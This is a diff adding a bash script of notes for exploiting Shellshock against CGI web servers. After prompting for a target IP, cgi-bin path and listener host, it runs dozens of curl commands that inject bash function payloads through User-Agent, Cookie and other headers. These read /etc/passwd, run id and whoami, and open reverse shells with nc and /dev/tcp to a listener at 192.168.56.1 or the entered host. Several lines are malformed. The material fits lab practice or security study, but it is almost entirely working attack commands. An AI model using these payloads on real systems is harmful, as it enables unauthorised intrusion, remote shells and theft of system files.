@@ -1,0 +1,76 @@
+#!/bin/bash
+
+#this script was not intended to just run i was taking nots so just maked it...please use it as manually not as script.
+
+read -p " Enter Taget ip : " target
+read -p " Enter Last field after cgi-bin/ : " last
+read -p " Enter lhost ip port is set to 1234 : " lhost
+
+echo "payload set as"; echo $target/cgi-bin/$last ; echo $lhost   
+
+curl -H "User-Agent: () { :; }; /bin/eject" http://$target 
+curl -H "User-Agent: () { :; }; /etc/passwd" http://$target 
+curl -H "User-Agent: () {:;}; /bin/cat /etc/passwd" http://$target 
+curl -H "() {:;}; /bin/cat /etc/passwd" http://$target 
+curl -H "host:() {:;}; /bin/cat /etc/passwd" http://$target 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$target/cgi-bin/ 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$target/cgi-bin/ 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$target/cgi-bin/$last 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'nc 192.168.56.1 1234 -e /bin/bash'" http://$target/cgi-bin/$last 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'nc 192.168.56.1 1234'" http://$target/cgi-bin/$last 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.1/1234 0>&1'" http://$target/cgi-bin/$last 
+
+curl -H () {:;}; echo; echo; /bin/bash -c 'id' "http://$target/cgi-bin/$last" \n\n\n"
+curl -H "User-Agent: () {:;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last" \n\n\n"
+curl -H "User-Agent: () {:;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "Cookies: () {:;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "Cookie: () {:;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "Cookie: () {:;}; echo; echo; /bin/bash -c 'whoami'" "http://$target/cgi-bin/$last"
+curl -H "Cookie: () {:;}; echo; echo; /bin/bash  'whoami'" "http://$target/cgi-bin/$last"
+curl -H "Cookie: () {:;}; echo; echo; /bin/id  " "http://$target/cgi-bin/$last"
+curl -H "Cookie: () {:;}; echo; echo; /bin/id" "http://$target/cgi-bin/$last"
+curl -H ": () {:;}; echo; echo; /bin/id" "http://$target/cgi-bin/$last"
+curl -H "Header: () {:;}; echo; echo; /bin/id" "http://$target/cgi-bin/$last"
+curl -H "Header: () {:;}; echo; hello" "http://$target/cgi-bin/$last"
+curl -H "Header: () {:;}; echo; echo; /bin/id" "http://$target/cgi-bin/$last"
+curl -H "Header: () {:;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "Header: () { ignored;};/bin/bash 'id'" "http://$target/cgi-bin/$last"
+curl -H "Header: () { ignored;};/bin/id " "http://$target/cgi-bin/$last"
+curl -H "Header: () { ignored;};/bin/id" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () { ignored;};/bin/id" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;};/bin/bash -c 'id' " "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;};/bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;};/bin/bash  'whoami'" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;}; echo; echo; /bin/bash -c 'id'" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;}; echo; echo; /bin/ls" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;}; /bin/ls" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () {ignored;};/bin/whoami" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/$lhost/1234/port 0>&1" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () { ignored;};/bin/bash -i '>& /dev/$lhost/1234/port 0>&1'" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () { ignored;};/bin/bash '-i >& /dev/$lhost/1234/port 0>&1" "http://$target/cgi-bin/$last"
+curl -H "User-Agent: () { ignored;};/bin/bash '-i >& /dev/$lhost/1234/port 0>&1'" "http://$target/cgi-bin/$last"
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;whoami" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;/usr/bin/whoami" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;/usr/bin/ls" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/ls" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/whoami" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/nc -e /bin/bash $lhost/8081" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; /bin/bash -i >& /dev/tcp/$lhost/8081 0>&1" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; /bin/bash -i >& /dev/tcp/$lhost/8081 0>&1" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/$lhost/8081 0>&1" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ;whoami" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; whoami" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; id" http://$target/cgi-bin/$last
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c 'id'" http://$target/cgi-bin/$last
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c '/bin/bash; whoami'" http://$target/cgi-bin/$last
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c '/bin/bash; whoami;id'" http://$target/cgi-bin/$last
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/8081 0>&1'" http://$target/cgi-bin/$last
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/8081 0>&1'" http://$target/cgi-bin/$last
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ;echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/1234 0>&1'" http://$target/cgi-bin/$last
+
